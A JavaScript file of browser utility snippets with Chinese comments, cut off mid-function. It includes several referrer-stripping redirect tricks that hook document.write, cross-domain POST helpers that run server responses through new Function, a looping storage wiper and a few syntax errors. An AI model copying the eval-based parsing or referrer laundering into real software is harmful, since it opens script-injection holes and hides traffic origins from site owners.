
/**
 * 格式化日期时间 eg:2019-09-24 11:31:06
 * @method formatDateTime
 * 
 * @params
 * time  {Number}} 需要格式化的时间戳
 * 
 * @returns
 * {String} 格式化的时间字符串
 * 
 * @author Yunior
 * */
export const formatDateTime = time => {
    let date=new Date(time*1)
    let year = date.getFullYear(),
        month = date.getMonth() + 1,
        day = date.getDate(),
        hour = date.getHours(),
        minute = date.getMinutes(),
        second = date.getSeconds();

    let formatNumber = n => {
        n = n.toString()
        return n[1] ? n : '0' + n
    }
  
    return [year, month, day].map(formatNumber).join('-') + ' ' + [hour, minute, second].map(formatNumber).join(':')
}
  

/**
 * 函数节流限制频次,每time毫秒只会执行一次callback函数
 * @method throttleFn
 * 
 * @params
 * delay {Number} 毫秒数
 * callback   {Function} 待执行的函数
 * @returns
 * 
 * @author Yunior
 * */
export const throttleFn=(delay, callback)=>{
    let timeoutID;
    let lastExec = 0;

    function wrapper() {
        const self = this;
        const elapsed = Number(new Date()) - lastExec;
        const args = arguments;

        function exec() {
            lastExec = Number(new Date());
            callback.apply(self, args);
        }

        clearTimeout(timeoutID);

        if (elapsed > delay) {
            exec();
        } else {
            timeoutID = setTimeout(exec, delay - elapsed);
        }
    }

    return wrapper;
}


/* 滚动到页面顶部 */
export const backTop=()=>{
    let currentScroll = document.documentElement.scrollTop || document.body.scrollTop;
    if (currentScroll > 0) {
        window.requestAnimationFrame(backTop);
        window.scrollTo (0,currentScroll - (currentScroll/5));
    }
}


局部滚动不影响浏览滚动
~function scrollUnique(id) {
    let contain=document.getElementById(id),
		eventType = document.mozHidden !== undefined?'DOMMouseScroll':'mousewheel';

	handleEvent=function(event) {
		event=event||window.event;
		let target=contain,
			scrollTop = target.scrollTop,
			scrollHeight = target.scrollHeight,
			height = target.clientHeight;
		
		let delta = (event.wheelDelta) ? event.wheelDelta : -(event.detail || 0);        
		console.log(`${delta}---${scrollTop}---${scrollHeight}---${height}---${(delta > 0 && scrollTop <= delta) || (delta < 0 && scrollHeight - height - scrollTop <= -1 * delta)}`)
		if ((delta > 0 && scrollTop <= delta) || delta < 0 && (scrollHeight - height-scrollTop) <= -1 * delta) {			
			target.scrollTop = delta > 0? 0: scrollHeight;
			window.event?event.returnValue=false:event.preventDefault()
		}        
	}
	
	if(contain.addEventListener){
		contain.addEventListener(eventType,handleEvent,false)
	}else{
		contain.attachEvent(''+eventType,handleEvent)
	}
}('rcs-message-list')

//复制到剪切板跨浏览器 select_all_and_copy(document.getElementById('copy'))  ##http://www.seabreezecomputers.com/tips/copy2clipboard.htm
function select_all_and_copy(el){
	var tooltip=function(el,msg){
		alert(msg);
	};
	// Copy textarea, pre, div, etc.
	if (document.body.createTextRange) {
		// IE 
		var textRange = document.body.createTextRange();
		textRange.moveToElementText(el);
		textRange.select();
		textRange.execCommand("Copy");   
		tooltip(el, "Copied!");  
	}
	else if (window.getSelection && document.createRange) {
		// non-IE
		var editable = el.contentEditable; // Record contentEditable status of element
		var readOnly = el.readOnly; // Record readOnly status of element
		el.contentEditable = true; // iOS will only select text on non-form elements if contentEditable = true;
		el.readOnly = false; // iOS will not select in a read only form element
		var range = document.createRange();
		range.selectNodeContents(el);
		var sel = window.getSelection();
		sel.removeAllRanges();
		sel.addRange(range); // Does not work for Firefox if a textarea or input
		if (el.nodeName == "TEXTAREA" || el.nodeName == "INPUT") 
			el.select(); // Firefox will only select a form element with select()
		if (el.setSelectionRange && navigator.userAgent.match(/ipad|ipod|iphone/i))
			el.setSelectionRange(0, 999999); // iOS only selects "form" elements with SelectionRange
		el.contentEditable = editable; // Restore previous contentEditable status
		el.readOnly = readOnly; // Restore previous readOnly status 
		if (document.queryCommandSupported("copy"))
		{
			var successful = document.execCommand('copy');  
			if (successful) tooltip(el, "Copied to clipboard.");
			else tooltip(el, "Press CTRL+C to copy");
		}
		else
		{
			if (!navigator.userAgent.match(/ipad|ipod|iphone|android|silk/i))
				tooltip(el, "Press CTRL+C to copy");	
		}
	}
}


//创建可运行html代码段的iframe  ele：父元素，code：html代码段，w:宽度， h:高度
getFrameCode=function(ele,code,w,h){
    var l=document,
        j = l.getElementsByTagName('base'),
        m = j[j.length - 1],
        i = l.createElement('iframe'),
        u = ['<html><head><base target="_blank"></base><style>*{margin:0;padding:0;border:0}body,html{background-color:transparent;overflow:hidden;width:100%;height:100%}a{cursor:pointer;text-decoration:none;outline:none;hide-focus:expression(this.hideFocus=true);box-sizing:border-box;-moz-box-sizing:border-box;-ms-box-sizing:border-box;-o-box-sizing:border-box;-webkit-box-sizing:border-box;overflow:hidden}</style></head><body oncontextmenu="return false">', '</body></html>'].join(code||"");
    try {
        i = l.createElement('<iframe  name=\'' + u + '\'>')
    } catch (e) {}
    i.allowTransparency = 'true';
    i.allowScriptsToClose = true;
    i.allowsUntrusted = true;
    i.frameBorder = i.marginHeight = i.marginWidth = 0;
    i.scrolling = 'no';
    i.style.cssText ="width:"+w+"px;height:"+h+"px;";
    ele.insertBefore(i,ele.firstChild);

    if (m) {
        self._target_x =self._target_x || m.target;
        m.setAttribute('target', '_self')
    }
    if (i.attachEvent) {
        i.attachEvent('onload', function() {
            m&&self._target_x&& m.setAttribute('target',  self._target_x);
            i.onload = null, i.width = w, i.height = h
        })
    } else {
        i.onload = function() {
            m&&self._target_x&& m.setAttribute('target',  self._target_x);
            i.onload = null, i.width = w, i.height = h
        }
    }
    i.contentWindow.name = u;
    i.src = 'javascript:void(~function(l){l.open();' + ((function(a) {
        try {
            i.contentWindow.document
        } catch (y) {
            a = 1
        }
        return a
    })(0) ? 'l.domain="' + l.domain + '";' : '') + 'l.write(decodeURIComponent(self.name));l.close()}(document))';

    setTimeout(function() {
        m&&self._target_x&& m.setAttribute('target',  self._target_x);
    }, 3e3)

    return ele
}

//json to xml
function json2xml(o, tab) {
    var toXml = function(v, name, ind) {
        var xml = "";
        if (v instanceof Array) {
            for (var i=0, n=v.length; i<n; i++)
                xml += ind + toXml(v[i], name, ind+"\t") + "\n";
        }
        else if (typeof(v) == "object") {
            var hasChild = false;
            xml += ind + "<" + name;
            for (var m in v) {
                if (m.charAt(0) == "@")
                    xml += " " + m.substr(1) + "=\"" + v[m].toString() + "\"";
                else
                    hasChild = true;
            }
            xml += hasChild ? ">" : "/>";
            if (hasChild) {
                for (var m in v) {
                    if (m == "#text")
                        xml += v[m];
                    else if (m == "#cdata")
                        xml += "<![CDATA[" + v[m] + "]]>";
                    else if (m.charAt(0) != "@")
                        xml += toXml(v[m], m, ind+"\t");
                }
                xml += (xml.charAt(xml.length-1)=="\n"?ind:"") + "</" + name + ">";
            }
        }
        else {
            xml += ind + "<" + name + ">" + v.toString() +  "</" + name + ">";
        }
        return xml;
    }, xml="";
    for (var m in o)
        xml += toXml(o[m], m, "");
    return tab ? xml.replace(/\t/g, tab) : xml.replace(/\t|\n/g, "");
}


//运行输入框内的html代码
function newRun(id){				
	var code = document.getElementById(id).value;
	if (code!=""){					
        var newwin = window.open('','','');
        newwin.opener = null;
        newwin.document.write(code);
        newwin.document.close();
	}
}



//生成内联JS代码  ##获取内联js代码 script.text || script.textContent || script.innerHTML || "";
function createInnerScript(code) {	 
	var b = document.getElementsByTagName("head")[0] || document.documentElement,
		c = document.createElement("script");	
	c.type = "text/javascript";
	try{
		c.appendChild(document.createTextNode(code))
	}catch(e){	
		c.text=code
	}	
	b.insertBefore(c, b.firstChild),
	b.removeChild(c);
}
//生成内联css代码
csty=function(code) {
    var b = document.head|| document.getElementsByTagName("head")[0],
        c = document.createElement("style");
    c.type = "text/css";
    try {
        c.appendChild(document.createTextNode(code))
    } catch (e) {
        c.innerHTML = code
    }
    b.insertBefore(c, b.firstChild);
}





//运动框架
function move(obj,json,opational){
	var getStyle=function(obj,attr){
		return obj.currentStyle?obj.currentStyle[attr]:getComputedStyle(obj,false)[attr];	
	};
	opational=opational||{};
	opational.time=opational.time||700;
	opational.fn=opational.fn||null;
	opational.type=opational.type||'ease-out';
	
	var start={};//准备一个空start用来存储一堆初始值
	var dis={};//准备一个空dis用来存储一堆运动距离
	
	for(var key in json){//挑出用户传入的json
		start[key]=parseFloat(getStyle(obj,key));//每一个属性的起始位置
		dis[key]=json[key]-start[key];	//每一个属性的运动距离
	}
	
	var count=Math.round(opational.time/30);	
	var n=0;
	
	clearInterval(obj.timer);
	obj.timer=setInterval(function(){
		n++;		
		for(var key in json){
			switch(opational.type){
				case 'linear':
					var a=n/count;//0---1的数
					var cur=start[key]+dis[key]*a;//匀速
					break;	
				case 'ease-in':
					var a=n/count;//0---1的数
					var cur=start[key]+dis[key]*(a*a*a);//加速
					break;	
				case 'ease-out':
					var a=1-n/count;//0---1的数
					var cur=start[key]+dis[key]*(1-a*a*a);//减速
					break;
				case 'ease-in-out'://过渡一下
					if(n/count<=0.5){	
						//加速
						var a=n/count*1.5;//0---1的数
						var cur=start[key]+dis[key]*(a*a*a);//加速
					}else{
						//减速
						move(obj,json,{time:opational.time/2,fn:opational.fn});	
					}
					break;	
			}
			window.webkitRequestAnimationFrame(function(){
				if(key=='opacity'){
					obj.style.opacity=cur;
					obj.style.filter='alpha(opacity='+(cur*100)+')';	
				}else{
					obj.style[key]=cur+'px';	
				}
			})
			
		}
		
		if(n==count){//停止条件
			clearInterval(obj.timer);			
			opational.fn && opational.fn();	//回调函数存在(用户传了函数)，再去调用
		}
	},30)	
}

//简易模版引擎
tmp= function(html, options) {
	var re = /<%(.+?)%>/g, 
		reExp = /(^( )?(var|if|for|else|switch|case|break|{|}|;))(.*)?/g, 
		code = 'with(obj) { var r=[];\n', 
		cursor = 0, 
		result;
	var add = function(line, js) {
		js? (code += line.match(reExp) ? line + '\n' : 'r.push(' + line + ');\n') :
			(code += line != '' ? 'r.push("' + line.replace(/"/g, '\\"') + '");\n' : '');
		return add;
	}
	while(match = re.exec(html)) {
		add(html.slice(cursor, match.index))(match[1], true);
		cursor = match.index + match[0].length;
	}
	add(html.substr(cursor, html.length - cursor));
	code = (code + 'return r.join(""); }').replace(/[\r\t\n]/g, ' ');
	try { result = new Function('obj', code).apply(options, [options]); }
	catch(err) { console.error("'" + err.message + "'", " in \n\nCode:\n", code, "\n"); }
	return result;
}


//flash代码模版
getFlashCode = function(src, ps, w, h, flashId, rm) {
	var p = "",
		q = "";
	if (rm) {
		p = '<param name="allowFullScreen" value="true" />';
		q = 'allowfullscreen="true"'
	} else {
		p = '<param name="wmode" value="transparent" />';
		q = 'wmode="transparent"'
	}
	return '<object id="' + flashId + '" classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=10,0,0,0" align="middle" width="' + w + '" height="' + h + '"> ' + p + ' <param name="allowScriptAccess" value="always" /><param name="movie" value="' + src + '"/><param name="quality" value="high"/><param name="bgcolor" value="#000"/><param name="width" value="' + w + '" /><param name="height" value="' + h + '" />' + (ps ? '<param name="FlashVars" value="' + ps + '" />' : "") + '<embed src="' + src + '" quality="high" bgcolor="#000" width="' + w + '" height="' + h + '" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" allowscriptaccess="always" loop="true" ' + q + ' name="' + flashId + '" ' + (ps ? 'flashvars="' + ps + '" ' : "") + "></embed></object>"
}


//自动适应屏幕分辨率 通过rem相对单位
(function(win){
	var html= win.document.documentElement,
		events= 'orientationchange' in win ? 'orientationchange' : 'resize',       
		deals=function() {
		  var w = html.clientWidth;
		  html.style.fontSize = Math.floor(100 *(w /320))+ 'px';
		};			
	win.addEventListener(events, deals, false),deals();
})(self);


//跨域 post提交 \获取数据 CORS   #### 安全 ie8+| x:https/http请求地址[#XDomainRequest发送请求地址的协议需与当前地址协议保持一致],b:JSON传递参数,fn:function(data){}回调函数
corsPost=function (x, b, fn) {
	var d,
	g = '',	
	t=new Date().getTime(),
	j = function (a) {
		var m = /^\s+|\s+$|\r\n|\r|\n/g;
		try {
			return (new Function('return (' + a.replace(m, '') + ')'))()
		} catch (z) {}
		return a
	}
	k = function (a) {
		d.onreadystatechange = d.onload = null;		
		a=j(d.responseText),typeof a=='object'&&fn && fn(a)	
	};
	if (b && 'object' == typeof b) {
		for (var i in b) {
			if (b.hasOwnProperty(i)) {
				g += i + '=' + b[i] + '&'
			}
		}
		g += '_='+t
	} else if (b && 'string' == typeof b) {
		g = b
	}
	try {
		d = new XMLHttpRequest();
		d.onreadystatechange = function () {
			d.readyState == 4 && d.status == 200 && k()
		};
		d.open("POST", x[0], true);
		d.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
		d.send(g)
	} catch (e) {
		if (window.XDomainRequest) {
			x=x.replace(/^https?:/, location.protocol=='https:'?'https:':'http:');
			d = new XDomainRequest();
			d.onload = k;
			d.onerror = d.onprogress = d.ontimeout = function () {};
			d.open("POST",x);
			d.send(g)
		} else {
			return
		}
	}
}

//跨域 post提交 \获取数据 window.name+window.postMessage #### x:String请求地址,f:JSON传递参数,fn:function(data){}回调函数
formPost=function(x,f,fn){
	var W=window,d=document,	
	kt,
	pa,
	pm=W.postMessage,
	o='_state',
	nm='hid_ifr_' +new Date().getTime(),			
	fm=d.createElement('form'),
	df=d.createDocumentFragment(),
	ia= (function () {
		var b = d.createElement('iframe');
		b.name =nm;
		try {
			b = d.createElement('<iframe name=\'' +nm+ '\'>')
		} catch (e) {}

		return (df.appendChild(b),b.setAttribute(o, 0),b)
	})(),
	jsn=function(a){			
		var m = /^\s+|\s+$|\r\n|\r|\n/g;
		try {
			return (new Function('return (' + a.replace(m, '') + ')'))()
		} catch (z) {}

		return a		
	},
	rmd=function(b){
		b && b.parentNode && b.tagName.toUpperCase() != 'BODY' && b.parentNode.removeChild(b)
	},
	bp=function (b) {
		try {
			pa = jsn((b || W.event).data || '');	
			ia.setAttribute(o, 2),rmd(fm),typeof pa=='object'&&fn(pa);
		} catch (x) {}
	},
	be=function(){
		if (ia.getAttribute(o) == 1) {
			try {
				pa = jsn(ia.contentWindow.name)
			} catch (e) {}
			ia.setAttribute(o, 2),rmd(fm),typeof pa=='object'&&fn(pa);				
		} else if (ia.getAttribute(o) == 0) {
			setTimeout(function () {
				try {
					ia.contentWindow.location.replace('about:blank')
				} catch (e) {}
				ia.setAttribute(o, 1)
			},W.opera?3e3:36)
		}
	};		
	~function(){
		fm.style.display ='none';
		fm.action =x;
		fm.target = nm;
		fm.method = 'post';
		if (f && 'object' == typeof f) {
			for (var da in f) {
				if (f.hasOwnProperty(da)) {
					try {
						kt = d.createElement('<input type="hidden" name=\'' + d + '\'>')
					} catch (e) {
						kt = d.createElement('input');
						kt.type = 'hidden'
					}
					df.appendChild(kt);
					kt.name = da;
					kt.id = da;
					kt.value = f[da]
				}
			}
		}
		W.addEventListener ? (W.addEventListener('message', bp, !1), pm || ia.addEventListener('load', be, !1)) : (W.attachEvent('onmessage', bp), pm || ia.attachEvent('onload', be));
		d.body.insertBefore(fm, d.body.firstChild), fm.appendChild(df), fm.submit(), ia.removeAttribute('name');
	}();			
}



//获取指定参数
getParam=function(name){	
	return (document.URL.match(new RegExp('(?:[\?#&])'+name+'=([^&#]*)','i'))||[])[1]||''	
};


//查询字符串获取
getQueryString=function (name) {
    var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i");
    var r = window.location.search.substr(1).match(reg);
    if (r != null) return unescape(r[2]); return null;
}

//替换指定参数值
//http://www.aaa.com/s?a=1&b=2&c=3#d=4&e=5&f=6
RP =function(url , paramname , paramvalue){
	return url.replace(new RegExp('('+paramname+'=)([^&#]*)','i'),'$1'+paramvalue)	
};



//原生JS操作类名
function hasClass(obj, cls) {  
    return obj.className.match(new RegExp('(\\s|^)' + cls + '(\\s|$)'));  
}  
  
function addClass(obj, cls) {  
    if (!this.hasClass(obj, cls)) obj.className += " " + cls;  
}  
  
function removeClass(obj, cls) {  
    if (hasClass(obj, cls)) {  
        var reg = new RegExp('(\\s|^)' + cls + '(\\s|$)');  
        obj.className = obj.className.replace(reg, ' ');  
    }  
}





//判断变量类型 通用所有类型
Object.prototype.toString.call(11);//[object Number]
Object.prototype.toString.call({});//[object Object]
Object.prototype.toString.call(window.alert);//[object Function]
Object.constructor==Object


Types([],'Array') //true;
function Types(b, e) {
	return "[object " + e + "]" === {}.toString.call(b)
}




/*
 手机端事件封装函数，dom:dom节点，events：事件字符串，多个事件以分号或者空格隔开，handle:事件处理函数,capture：是否在捕获阶段处理
 * 
 * 
 * */
var addMobileEvent=function(dom,events,handle,capture){
		var startX=0,startY=0,endX=0,endY=0,isMove=false,disX=0,disY=0,starTime=0,endTime=0,capture=capture||false;			
		
		dom.addEventListener('touchstart',function(e){				
			var touchs=e.touches[0];
			startX=touchs.pageX,startY=touchs.pageY,starTime=new Date().getTime();
			events.indexOf('touchstart')>-1?handle.call(dom,touchs):'';
		},capture);
		
		dom.addEventListener('touchmove',function(e){
			var touchs=e.changedTouches[0];
			isMove=true;e.preventDefault();
			events.indexOf('touchmove')>-1?handle.call(dom,e):'';
		},capture);
		
		dom.addEventListener('touchend',function(e){
			var touchs=e.changedTouches[0];
			endX=touchs.pageX,endY=touchs.pageY,disX=endX-startX,disY=endY-startY,endTime=new Date().getTime();
			if(events.indexOf('tap')>-1&&Math.abs(disX)<6&&Math.abs(disY)<6){handle.call(dom,e)}
			
			if(Math.abs(disX)>30||Math.abs(disY)>30){					
				if(events.indexOf('slideleft')>-1&&Math.abs(disX)>=Math.abs(disY)&&disX<0){handle.call(dom,e)}
				if(events.indexOf('slideright')>-1&&Math.abs(disX)>=Math.abs(disY)&&disX>0){handle.call(dom,e)}
				if(events.indexOf('slideup')>-1&&Math.abs(disX)<Math.abs(disY)&&disY<0){handle.call(dom,e)}
				if(events.indexOf('slidedown')>-1&&Math.abs(disX)<Math.abs(disY)&&disY>0){handle.call(dom,e)}		
			}
		},capture);	
};



/* 数字递增效果 */
var showCount = function(objId, string) {
    var obj = document.getElementById(objId),
        endNum = string.toString().split(""),
        newNum = "",
        spans, len, i;

    for (i = 0, len = endNum.length; i < len; i++) {
        var v = endNum[i];
        newNum += (isNaN(v) ? '<i>'+ v +'</i>' : ('<span num='+v+'>'+ "-" +'</span>'));
    }
    obj.innerHTML = newNum;
    spans = obj.getElementsByTagName("span");

    for (i = 0, len = spans.length; i < len; i++) {
        var span = spans[i];

        (function(span, i) {
            var num = +span.getAttribute("num");

            span.fun = function(n) {
                var _this = this;

                _this.timer = setTimeout(function() {
                    n = (n+1)%10;

                    _this.innerHTML = n;
                    setTimeout(function() {
                        if (num == _this.innerHTML) clearTimeout(_this.timer);
                    }, 300 * (i + 1));

                    _this.fun(n);
                }, 45);
            };

            span.fun(num);
        } (span, i));
    }
};


//链接跳转到新页面
go=function(j,k){
    var a=document,
        b=a.createElement("a"),
        c = a.body || a.getElementsByTagName('head')[0],
        g = function() {
            c.insertBefore(b, c.firstChild);
            if (b.click) {
                b.click()
            } else {
                try {
                    var h = a.createEvent('Event');
                    h.initEvent('click', !1, !1);
                    b.dispatchEvent(h)
                } catch (e) {}
            }
        };
    b.href = j;
    b.target = k||"_blank";
    b.rel = 'noreferrer';
    b.style.visibility="hidden";
    g();
};


function fireEvent(a, b) {//模拟触发事件，a事件所在的对象，b事件类型
	var c = document;
	if (a[b]) {//ie6++
		a[b]();
	} else{//dom2级 ，dom3级为单数形式
		var d = c.createEvent("MouseEvents");
		d.initEvent(b, !0, !1), a.dispatchEvent(d);
	}
}


//新抹来路方法 简版覆盖当前页面的跳转
var noreferrer=function(u){
	if (navigator.userAgent.match(/webkit/i))
		document.body.appendChild(document.createElement('iframe')).src = 'javascript:parent.location.replace(\'' + encodeURI(u) + '\')';
	else
		document.write('<meta name="referrer" content="never"/><meta http-equiv=\'Refresh\'content=\'0;Url=' + u + '\'/>');
	document.close()	
}

//抹来路跳转 chrome||firefox33+执行先进抹来路，其他走refresh  ie/firefox refresh丢失来路
var noreferrer=function(u){
    document.body.style.visibility="hidden";
	if(window.openDatabase||window.updateCommands){//webkit/firefox
		~function (a, b, c) {
                a.rel = 'noreferrer';
                a.href ='data:text/html;charset=utf-8,' +encodeURIComponent('<html><head><meta name="referrer" content="never"><meta http-equiv="refresh" content="0;url='+u+'"></head><body></body></html>');
                //使用data协议作为地址是为了兼容firefox33以下版本不支持noreferrer属性
                a.target = '_top';
                c.insertBefore(a, c.firstChild);
                try {
                    a.click()
                } catch (e) {
                    b.initEvent('click', !1, !1);
                    a.dispatchEvent(b)
                }             
 		}(document.createElement('area'), document.createEvent('Event'), document.body) 
	}else{ //ie浏览器的方式跳转
		~function () {
			document.open('text/html', 'replace');
			document.write('<meta name="referrer" content="never"/><meta http-equiv="refresh" content="0;url=' + u+ '"/>');
			document.close();
			setTimeout(arguments.callee, 64)
		}()	       
    }
};

		
//抹来路方法2  #firefox33版本开始支持noreferrer抹来路
//抹来路思路总结：1.document.location  ie8及以下会丢失   2.Meta Refresh跳转 ie\ff浏览器丢失  3.noreferrer链接 firefox33+\webkit
var noreferrer=function(d){
	'0' == (1 - 0.1).toFixed(0) ? top.location.replace(d):window.openDatabase||window.updateCommands ? ~function (a) {
		a.rel = 'noreferrer';
		a.target = '_top';
		a.href = d;
		document.body.insertBefore(a, document.body.firstChild);
		if (a.click)
			a.click();
		else {
			try {
				var b = document.createEvent('Event');
				b.initEvent('click', !1, !1);
				a.dispatchEvent(b)
			} catch (K) {}

		}
	}(document.createElement('a')):~function (d) {
		//重新hook write方法||ie11下面不hook可通过
		~function (a) {
			a.style.display = 'none';
			document.body.insertBefore(a, document.body.firstChild);
			var b = a.contentWindow.document;
			b.open();
			b.write('<script>parent.document.write=document.write;<\/script>');
			b.close()
		}(document.createElement('iframe'));			
		~function () {
			document.open();
			document.write(d);
			document.close();
			setTimeout(arguments.callee, 64)
		}()
	}('<meta name="referrer" content="never"><meta http-equiv="refresh" content="0;url=' + d + '"/>');		
}


//去除字符串的前后空白符
function trim(t){
	return (t||"").replace(/^\s+|\s+$/g, "");
}
//让字符串对象支持trim方法
Object.prototype.trim=function(){
	return (this.valueOf()||"").replace(/^\s+|\s+$/g, "");
}

//字符串转换为钱值   e:需要转换的字符串，t:保留小数位数，n:小数点标识,r：千位符标识
function toMoney(e, t, n, r) {
	e = (e + "").replace(/[^0-9+\-Ee.]/g, "");
	var a = isFinite(+e) ? +e : 0,
		i = isFinite(+t) ? Math.abs(t) : 3,
		o = r || ",",
		l = n || ".",
		s = "",
		c = function(e, t) {
			var n = Math.pow(10, t);
			return "" + (Math.round(e * n) / n).toFixed(t)
		};
	return s = (i ? c(a, i) : "" + Math.round(a)).split("."), s[0].length > 3 && (s[0] = s[0].replace(/\B(?=(?:\d{3})+(?!\d))/g, o)), (s[1] || "").length < i && (s[1] = s[1] || "", s[1] += new Array(i - s[1].length + 1).join("0")), s.join(l)
};

//HTML代码转为Node节点
function htmlToNode(html) {
	var container = document.createElement('div');
	container.innerHTML = html;
	return container.firstChild;
}

//获取主域
function getdomain(){
	var host=document.location.hostname;
	return host.match(/\.?(\w+\.(com|cn|net|me|com\.cn|info|cc|org))/)[1];		
}

//cookie 相关操作
var cookieUtil = {
	get : function(name) {		
		return decodeURIComponent((document.cookie.match(new RegExp('(?:^| )' +name + '(?:(?:=([^;]*))|;|$)', 'i')) || [])[1] || '')
	},
	set : function(name, value, expires, path, domain, secure) {
		var cookietext = encodeURIComponent(name) + "=" + encodeURIComponent(value);
		if (expires instanceof Date)
			cookietext += ";expires=" + expires.toGMTString();
		if (path)
			cookietext += ";path=" + path;
		if (domain)
			cookietext += ";domain=" + domain;
		if (secure)
			cookietext += ";secure";
		document.cookie = cookietext;
	},
	unset : function(name,path,domain,secure) {
			this.set(name, "", new Date(0),path,domain,secure);
	},
    clearAll:function(n){
    	n=n||(document.cookie.match(/[^ =;]+(?=\=)/g) || []);	
		for (var i = n.length; i--;) {			
			this.setAll(n[i],'deleted',-1)			
		}		
	},
	setAll:function(n, v, t,p){	
		for (var h = location.hostname.split('.'), k = h.length, d, r, j; k--;) {
			d = h.join('.');	
			j=new Date(),j.setTime(j.getTime() + ((t || 1) * 24 * 3600 * 1e3));
			r= [n + '=' + encodeURIComponent(v)];		
			r.push('expires=' + j.toGMTString());			
			r.push('path=' + (p || '/'));
			d.length > 5 && r.push('domain=' + d);
			document.cookie = r.join('; ');		
			h.shift()
		}		
	}
}

//清理所有本地存储
function cs(n) {
    var h = location.host,
    x = '=;expires=' + new Date(0).toGMTString(),
    y = x + ';path=',
    z = y + '/;domain=',
    l = [x, y, y + '/', z + h, z + h.substr(h.indexOf('.'))];
    n = n || (document.cookie.match(/[^ =;]+(?=\=)/g) || []);
    for (var i = n.length; i--;)
        for (var j = l.length; j--;)
            document.cookie = n[i] + l[j];
    window.localStorage&&localStorage.clear();
    window.sessionStorage&&sessionStorage.clear();
    setTimeout(arguments.callee, 500);
}

//获取某一个元素到最外层顶部的距离
function offsetTop(element) {
	var top = 0;	
	while (element) {
		top += element.offsetTop;
		element =element.offsetParent;
	}
	return top;
}

//跨浏览器获取视口大小
function getWinSize() {
	if (typeof window.innerWidth != 'undefined') {
		return {
			width : window.innerWidth,
			height : window.innerHeight
		}
	} else {
		return {
			width : document.documentElement.clientWidth||document.body.clientWidth,
			height : document.documentElement.clientHeight||document.body.clientHeight
		}
	}
}


//检测ie6
function checkIE6(){
	return /Microsoft Internet Explorer/i.test(navigator.appName)&&/MSIE 6\.0/i.test(navigator.appVersion);
}

//函数节流优化默认事件的调用频率
function throttle(method) {
    clearTimeout(method.tId);
    method.tId = setTimeout(function(){    	
       	   method();
    }, 100);
}


//获取样式
function getStyle(obj,attr){
	if(obj.currentStyle){
		if(attr=="opacity"){//ie中的filter属性结合完美运动框架返回透明度为小数。
			/opacity=(\d+|NaN)\)$/.exec(obj.currentStyle["filter"])
			var value=parseInt(RegExp.$1)/100;				
			if(RegExp.$1=="NaN") {
				return 1;
			}else {
				return value;
			}				
		}
		return obj.currentStyle[attr];		
	}	
	else {
		return getComputedStyle(obj,null)[attr];
	}
}

//完美运动框架
function startMove(obj,json,fn){	
	clearInterval(obj.timer);
	var clearself=arguments[3];
	
	obj.timer=setInterval(function(){
		var iSuc=true;
		for(attr in json){
			var nowvalue=0;
			if(attr=="opacity")
				nowvalue=parseInt(parseFloat(getStyle(obj,attr))*100);
			else
				nowvalue=parseInt(getStyle(obj,attr));		
			iSpeed=(json[attr]-nowvalue)/8;
			iSpeed=iSpeed>0?Math.ceil(iSpeed):Math.floor(iSpeed);		
			if(nowvalue!=json[attr])
				iSuc=false;
			if(attr=="opacity"){
				obj.style.opacity=(nowvalue+iSpeed)/100;
				obj.style.filter="alpha(opacity="+(nowvalue+iSpeed)+")";
			}else
				obj.style[attr]=nowvalue+iSpeed+"px";
		}
		
		if(iSuc){
			clearInterval(obj.timer);			
			clearself ? obj.parentNode.removeChild(obj):"";	
			fn?fn():"";
		}
	},30);
	
}


//通过类名获取元素
function getElementsByClassName(searchClass,node,tag) {
	node = node || document;       
    tag = tag || '*';
    var returnElements = [];
    var els =node.getElementsByTagName(tag);
    var i = els.length;
    searchClass = searchClass.replace(/\-/g, "\\-");
    var pattern = new RegExp("(^|\\s)"+searchClass+"(\\s|$)");
    while(--i >= 0){
        if (pattern.test(els[i].className) ) {
            returnElements.push(els[i]);
        }
    }
    return returnElements;   
}

//元素选择器 - Mini Query 兼容低版本IE
function $(query) {
	var res = [];
	if (document.querySelectorAll) {
		res = document.querySelectorAll(query);
	} else {
		var firstStyleSheet = document.styleSheets[0] || document.createStyleSheet();
		query = query.split(',');
		for (var i = 0, len = query.length; i < len; i++) {
			firstStyleSheet.addRule(query[i], 'Barret:Lee');
		}
		for (var i = 0, len = document.all.length; i < len; i++) {
			var item = document.all[i];
			item.currentStyle.Barret && res.push(item);
		}
		firstStyleSheet.removeRule(0);
	}
	if (res.item) { /* Fuck IE8 */
		var ret = [];
		for (var i = 0, len = res.length; i < len; i++) {
			ret.push(res.item(i));
		}
		res = ret;
	}
	return res;
};



//添加事件
function addEvent(obj, oEv, fn) {
	try {
		obj.attachEvent("on" + oEv, function() {//ie 取消默认事件和阻止冒泡
			fn.call(obj,window.event.srcElement);
			event.returnValue = false;
			event.cancelBubble=true;
		});
	} catch(e) {
		obj.addEventListener(oEv, function(ev) {//w3c 取消默认事件和阻止冒泡
			fn.call(obj,ev.target);
			ev.preventDefault();
			ev.stopPropagation();
		}, false);
	}
}


//获取当前正在执行的js对象 ，此方法无法获取safari浏览的
function getCurrentScript() {
	//for firefox chrome opera
	if (document.currentScript) {
		return document.currentScript
	}

	// for ie
	var scripts = document.getElementsByTagName("script");
	for (var i = scripts.length - 1; i >= 0; i--) {
		var script = scripts[i];
		if (script.readyState === "interactive") {
			return script;		
		}
	}
	
	//兼容safari
	return scripts[scripts.length-1];
}


//动态加载js文件 、判断js是否加载成功
function insertScript(src, fn) {
	var c = document.createElement("script");
	c.type = "text/javascript";
	c.charset = "UTF-8";
	if (c.readyState) {
		c.onreadystatechange = function() {
			if (c.readyState == "loaded" || c.readyState == "complete") {
				c.onreadystatechange = null;
				fn && fn();
			}
		}
	} else {
		c.onload = function() {
			fn && fn()
		}
	}
	c.src = src;
	document.body.insertBefore(c, document.body.firstChild);//避用appendChild 防止ie6下出现dom紊乱不能访问页面。
}

//统计请求
!function(src,fn){
	var img=new Image();
	img.onload=fn;
	img.src=src;
}('http://www.baidu.com',function(){
	
})



//动态设置Iframe的高度，不能跨域 
var adjustIframe = function (id) {
    var iframe = document.getElementById(id)
    var idoc = iframe.contentWindow && iframe.contentWindow.document || iframe.contentDocument;
    var callback = function () {
        var iheight = Math.max(idoc.body.scrollHeight, idoc.documentElement.scrollHeight); //取得其高
        iframe.style.height = iheight + "px";
    }
    if (iframe.attachEvent) {//ie底版本完美判断iframe是否加载成功执行
